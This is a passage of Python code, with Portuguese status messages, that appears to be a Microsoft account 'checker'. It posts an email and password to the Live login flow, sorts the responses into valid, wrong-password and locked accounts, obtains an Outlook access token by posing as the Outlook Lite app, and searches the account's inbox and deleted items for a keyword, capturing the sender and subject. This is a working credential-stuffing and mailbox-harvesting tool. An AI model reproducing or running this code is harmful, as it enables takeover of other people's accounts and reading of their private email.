        if not url_post or not ppft: return False, "Falha na proteção Microsoft", None
        URL = url_post.group(1)
        PPFT = ppft.group(1)

        # 2. Enviar credenciais
        post_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={PPFT}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
        cookies = session.cookies.get_dict()
        cookie_header = f"MSPRequ={cookies.get('MSPRequ','')}; uaid={cookies.get('uaid','')}; RefreshTokenSso={cookies.get('RefreshTokenSso','')}; MSPOK={cookies.get('MSPOK','')}; OParams={cookies.get('OParams','')}; MicrosoftApplicationsTelemetryDeviceId={UUID}"
        headers3 = {"User-Agent": headers2["User-Agent"], "Content-Type": "application/x-www-form-urlencoded", "Cookie": cookie_header, "Origin": "https://login.live.com"}
        r3 = session.post(URL, data=post_data, headers=headers3, allow_redirects=False, timeout=15)
        if "account or password is incorrect" in r3.text.lower():
            return False, "Senha incorreta", None
        if "confirm" in r3.text.lower() or "recover" in r3.text.lower():
            return False, "Conta bloqueada (Identity/Recover)", None
        if "abuse" in r3.text.lower() or "finisherror" in r3.text.lower():
            return False, "Conta bloqueada (Abuse)", None
        code_match = re.search(r'code=([^&]+)&', r3.headers.get('Location', ''))
        if not code_match: return False, "Falha ao extrair code", None
        Code = code_match.group(1)

        # 3. Obter access token
        token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={Code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
        ATK = r4.json().get('access_token')
        if not ATK: return False, "Sem access token", None

        # 4. Buscar emails com a keyword
        search_body = {
            "Cvid": "49c85090-df47-7cfc-7dff-b6f493b9eaec",
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "E. South America Standard Time",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}, {"Term": {"DistinguishedFolderName": "DeletedItems"}}]},
                "From": 0,
                "Query": {"QueryString": keyword},
                "Size": 25,
                "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
            }],
            "LogicalId": "50288413-6c68-e7d3-ab47-2be5431628f2"
        }
        headers_search = {"User-Agent": "Outlook-Android/2.0", "Authorization": f"Bearer {ATK}", "Host": "substrate.office.com", "Content-Type": "application/json"}
        r5 = session.post("https://outlook.live.com/searchservice/api/v2/query?n=88&cv=z%2B4rC2Rg7h%2BxLG28lplshj.124", json=search_body, headers=headers_search, timeout=15)
        data = r5.json()
        total = data.get('Total', '')
        if total == '':
            entity_sets = data.get('EntitySets', [])
            if entity_sets:
                result_sets = entity_sets[0].get('ResultSets', [])
                if result_sets:
                    total = result_sets[0].get('Total', '0')
        try:
            total_int = int(total)
        except:
            total_int = 0
        captures = {"Total": str(total_int)}
        if total_int > 0:
            results = result_sets[0].get('Results', [])
            if results:
                last = results[0].get('Source', {})
                from_field = last.get('From', {})
                if isinstance(from_field, dict):
                    captures['Sender'] = from_field.get('EmailAddress', {}).get('Address', '')
                captures['Subject'] = last.get('ConversationTopic', '').strip()
            return True, f"Encontrados {total_int} e-mails para '{keyword}'", captures
        else:
            return True, f"Conta válida, 0 e-mails para '{keyword}'", captures
    except Exception as e:
        return False, f"Erro: {e}", None
